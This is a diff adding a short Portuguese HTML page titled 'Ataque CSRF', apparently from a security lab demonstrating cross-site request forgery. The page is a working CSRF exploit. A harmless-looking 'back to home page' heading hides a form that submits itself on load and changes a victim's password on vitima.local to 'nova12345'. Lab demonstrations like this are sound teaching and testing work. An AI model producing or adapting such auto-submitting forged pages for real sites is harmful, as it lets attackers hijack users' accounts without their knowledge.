@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Ataque CSRF</title>
+  </head>
+  <body>
+    <h1>Voltar para a página inicial</h1>
+
+    <form action="http://vitima.local:3001/change-password-segura" method="POST">
+      <input type="hidden" name="password" value="nova12345" />
+      <button type="submit">Ir agora!</button>
+    </form>
+
+    <script>
+      // Envia automaticamente o formulário
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
